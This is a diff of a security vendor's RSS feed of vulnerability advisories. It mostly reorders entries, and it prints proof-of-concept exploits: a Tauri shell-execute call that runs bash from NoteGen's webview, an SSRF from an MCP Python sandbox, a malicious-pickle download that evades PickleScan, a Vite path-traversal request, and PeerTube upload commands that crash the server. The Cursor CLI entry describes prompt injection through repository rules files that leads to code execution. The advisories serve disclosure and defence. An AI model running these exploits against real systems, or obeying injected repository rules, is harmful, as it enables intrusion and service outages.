@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Sun, 30 Aug 2026 00:41:46 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 30 Aug 2026 08:56:50 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -221,6 +221,74 @@ https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
             <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
             <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
@@ -298,74 +366,6 @@ Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTM
 ## References
 https://github.com/advisories/GHSA-gwhc-vprp-gfcg
 https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
-https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
-            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
-
-
-## Component
-
-note-gen (NoteGen)
-
-## Affected versions
-
-< 0.32.0
-
-## Description
-
-NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
-
-## PoC
-
-<br>
-
-**Step 1 - Obtain JavaScript execution in the NoteGen webview**
-
-<br>
-
-Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
-
-<br>
-
-**Step 2 - Invoke the Tauri shell execute API**
-
-<br>
-
-From the webview, call:
-
-```javascript
-window.__TAURI__.core.invoke('plugin:shell|execute', {
-  program: 'bash',
-  args: ['-c', 'open -a Calculator'],
-  options: { cwd: null, env: null, encoding: 'utf-8' }
-});
-```
-
-<br>
-
-**Step 3 - Verify OS command execution**
-
-<br>
-
-Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
-
-## Vulnerability Mitigations
-
-Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
-
-## References
-https://github.com/advisories/GHSA-r5ff-hq22-rhgv
-https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
 https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
@@ -605,6 +605,76 @@ https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Overly permissive Deno configuration in mcp-run-python leads to SSRF
+
+## Component
+
+mcp-run-python
+
+## Affected versions
+
+(,)
+
+## Description
+
+The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
+
+## PoC
+
+1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
+
+   ```json
+   {
+   "mcpServers": {
+   "mcp-run-python":{
+           "command": "uvx",
+           "args": [
+           "mcp-run-python",
+           "stdio"
+           ]
+       }
+     }
+   }
+   ```
+
+2. Start a HTTP server listening to the localhost interface:
+
+   ```bash
+   python3 -m http.server -b 127.0.0.1 1234
+   ```
+
+3. Ask the MCP client to run this PoC code:
+
+   ```python
+   from pyodide.http import pyfetch
+   response = await pyfetch("http://localhost:1234")
+   data = await response.text()
+   print(data)
+   ```
+
+4. View that the localhost server got a request from the tool
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[mcp-run-python lack of isolation MCP takeover]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</guid>
@@ -691,76 +761,6 @@ js.JSON.stringify = js_func
 9. The tool will seem stuck, Note the new notifications/tools/list\_changed notification from the server
 10. Click on `Clear` and then `List Tools`  
 11. Note that the tool name changed from `run_python_code` to `Hijacked Tool`
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
-            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Overly permissive Deno configuration in mcp-run-python leads to SSRF
-
-## Component
-
-mcp-run-python
-
-## Affected versions
-
-(,)
-
-## Description
-
-The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
-
-## PoC
-
-1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
-
-   ```json
-   {
-   "mcpServers": {
-   "mcp-run-python":{
-           "command": "uvx",
-           "args": [
-           "mcp-run-python",
-           "stdio"
-           ]
-       }
-     }
-   }
-   ```
-
-2. Start a HTTP server listening to the localhost interface:
-
-   ```bash
-   python3 -m http.server -b 127.0.0.1 1234
-   ```
-
-3. Ask the MCP client to run this PoC code:
-
-   ```python
-   from pyodide.http import pyfetch
-   response = await pyfetch("http://localhost:1234")
-   data = await response.text()
-   print(data)
-   ```
-
-4. View that the localhost server got a request from the tool
 
 
 
@@ -1153,46 +1153,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
-            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
-
-## Component
-
-[Cursor CLI](https://github.com/cursor/cursor)
-
-## Affected versions
-
-( , 2025.09.17-25b418f)
-
-## Description
-
-Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
-
-The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
-
-
-
-## PoC
-
-No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are available for this issue
-
-## References
-
-[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[DSPy sandbox escape arbitrary file read]]></title>
             <link>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</link>
             <guid>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</guid>
@@ -1236,6 +1196,46 @@ No mitigations are supplied for this issue
 
 
 
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
+            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
+
+## Component
+
+[Cursor CLI](https://github.com/cursor/cursor)
+
+## Affected versions
+
+( , 2025.09.17-25b418f)
+
+## Description
+
+Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
+
+The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
+
+
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are available for this issue
+
+## References
+
+[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
 ]]></content:encoded>
         </item>
         <item>
@@ -1472,54 +1472,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bypass in PickleScan's unsafe globals check allows malicious code execution via submodules of dangerous packages.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-A Protection Mechanism Failure vulnerability in picklescan allows a remote attacker to bypass the unsafe globals check. This is possible because the scanner performs an exact match for module names, allowing malicious payloads to be loaded via submodules of dangerous packages (e.g., `asyncio.unix_events` instead of `asyncio`). When the file, incorrectly deemed safe, is loaded, it can lead to malicious code execution.
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability exists in PickleScan's mechanism for identifying unsafe global imports in pickle files. The scanner checks for dangerous modules by comparing the imported module's name against a blocklist using an exact string match. An attacker can circumvent this check by importing a submodule of a dangerous package (e.g., `asyncio.unix_events`) instead of the parent package itself (`asyncio`). Because `asyncio.unix_events` is not an exact match for `asyncio` in the blocklist, PickleScan fails to flag the import as dangerous, allowing the malicious file to pass the scan.
-
-## PoC
-
-The following steps demonstrate the bypass.
-
-```bash
-# 1. Download a malicious pickle file that uses a submodule of a dangerous package.
-wget https://huggingface.co/iluem/linux_pkl/resolve/main/asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl
-
-# 2. Scan the file with PickleScan.
-picklescan -p asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl -g
-
-# Observed Result: PickleScan marks the import as "Suspicious" but fails to identify it as a "dangerous" import, allowing it to pass.
-# Expected Result: PickleScan should recognize any submodule of 'asyncio' as dangerous and flag the file as malicious.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
@@ -1567,6 +1519,54 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bypass in PickleScan's unsafe globals check allows malicious code execution via submodules of dangerous packages.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+A Protection Mechanism Failure vulnerability in picklescan allows a remote attacker to bypass the unsafe globals check. This is possible because the scanner performs an exact match for module names, allowing malicious payloads to be loaded via submodules of dangerous packages (e.g., `asyncio.unix_events` instead of `asyncio`). When the file, incorrectly deemed safe, is loaded, it can lead to malicious code execution.
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability exists in PickleScan's mechanism for identifying unsafe global imports in pickle files. The scanner checks for dangerous modules by comparing the imported module's name against a blocklist using an exact string match. An attacker can circumvent this check by importing a submodule of a dangerous package (e.g., `asyncio.unix_events`) instead of the parent package itself (`asyncio`). Because `asyncio.unix_events` is not an exact match for `asyncio` in the blocklist, PickleScan fails to flag the import as dangerous, allowing the malicious file to pass the scan.
+
+## PoC
+
+The following steps demonstrate the bypass.
+
+```bash
+# 1. Download a malicious pickle file that uses a submodule of a dangerous package.
+wget https://huggingface.co/iluem/linux_pkl/resolve/main/asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl
+
+# 2. Scan the file with PickleScan.
+picklescan -p asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl -g
+
+# Observed Result: PickleScan marks the import as "Suspicious" but fails to identify it as a "dangerous" import, allowing it to pass.
+# Expected Result: PickleScan should recognize any submodule of 'asyncio' as dangerous and flag the file as malicious.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
 ]]></content:encoded>
         </item>
         <item>
@@ -1786,6 +1786,54 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Vite arbitrary remote HTML file leak
+
+## Component
+
+[vite](https://www.npmjs.com/package/vite)
+
+## Affected versions
+
+\>=7.1.0,<=7.1.4
+
+\>=7.0.0,<=7.0.6
+
+\>=6.0.0,<=6.3.5
+
+<=5.4.19
+
+## Description
+
+This vulnerability allows a remote attacker to leak any HTML file on the system.
+
+## PoC
+
+Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
+
+```shell
+curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this vulnerability 
+
+
+
+## References
+
+[Fix PR](https://github.com/vitejs/vite/pull/20736)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Vite arbitrary restricted remote file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</link>
             <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</guid>
@@ -1854,54 +1902,6 @@ No mitigations are supplied for this vulnerability
 ## References
 
 [Fix PR](https://github.com/vitejs/vite/pull/20735)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Vite arbitrary remote HTML file leak
-
-## Component
-
-[vite](https://www.npmjs.com/package/vite)
-
-## Affected versions
-
-\>=7.1.0,<=7.1.4
-
-\>=7.0.0,<=7.0.6
-
-\>=6.0.0,<=6.3.5
-
-<=5.4.19
-
-## Description
-
-This vulnerability allows a remote attacker to leak any HTML file on the system.
-
-## PoC
-
-Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
-
-```shell
-curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this vulnerability 
-
-
-
-## References
-
-[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
@@ -2755,6 +2755,124 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32944 Medium severity. PeerTube User Import Authenticated Persistent Denial of Service]]></description>
+            <content:encoded><![CDATA[## Summary
+An Uncaught Exception in PeerTube can lead to a persistent Denial of Service in User Import.
+
+This vulnerability allows any authenticated user to cause the server to stop functioning in a persistent manner.
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
+If the yauzl library encounters a filename that is considered illegal, [it raises an exception](https://github.com/thejoshwolfe/yauzl/blob/de292f220268473eb20aef64b0a77faa9d004d9a/index.js#L737). For example, if a filename includes “..” in one of its parts, an “invalid relative path” error is raised. PeerTube does not catch this exception, thus it crashes. Even after starting the server again, it tries to read the file and crashes again, causing a permanent denial of service until the file is deleted from the system.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
+1. Create a file `evil.zip` in the current directory, which contains at least one zip entry with a `..` in its path
+1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
+```
+new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
+curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
+```
+If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32949 Medium severity. PeerTube User Import Authenticated Resource Exhaustion]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any authenticated user to cause the server to consume very large amounts of disk space when extracting a Zip Bomb
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
+The yauzl library does not contain any mechanism to detect or prevent extraction of a [Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb). Therefore, when using the User Import functionality with a Zip Bomb, PeerTube will try extracting the archive which will cause a disk space resource exhaustion.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
+1. Create a Zip Bomb named `evil.zip` in the current directory
+1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
+```
+new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
+curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
+```
+If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
@@ -2879,124 +2997,6 @@ This PoC assumes that there is a PeerTube instance on the machine listening on p
 curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
 ```
 The .m3u8 file will be returned.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32944 Medium severity. PeerTube User Import Authenticated Persistent Denial of Service]]></description>
-            <content:encoded><![CDATA[## Summary
-An Uncaught Exception in PeerTube can lead to a persistent Denial of Service in User Import.
-
-This vulnerability allows any authenticated user to cause the server to stop functioning in a persistent manner.
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
-If the yauzl library encounters a filename that is considered illegal, [it raises an exception](https://github.com/thejoshwolfe/yauzl/blob/de292f220268473eb20aef64b0a77faa9d004d9a/index.js#L737). For example, if a filename includes “..” in one of its parts, an “invalid relative path” error is raised. PeerTube does not catch this exception, thus it crashes. Even after starting the server again, it tries to read the file and crashes again, causing a permanent denial of service until the file is deleted from the system.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
-1. Create a file `evil.zip` in the current directory, which contains at least one zip entry with a `..` in its path
-1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
-```
